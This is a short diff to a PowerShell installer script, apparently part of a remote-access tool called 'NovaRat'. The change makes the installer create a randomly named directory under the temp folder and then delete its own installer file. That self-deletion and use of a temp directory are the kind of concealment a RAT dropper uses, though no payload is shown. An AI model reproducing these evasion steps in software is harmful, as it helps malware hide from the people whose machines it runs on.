@@ -9,11 +9,11 @@ function random_text {
 ## variables
 $wd = random_text
 $path = "$env:temp/$wd"
-echo $path
+$initial_dir = "%cd%"
 
 #goto temp, make working directory
 mkdir $path
 cd $path
 echo "" > poc.txt
-cd C:\Users\CodeO\Desktop\NovaRat\files
-
+cd $initial_dir
+del installer.ps1
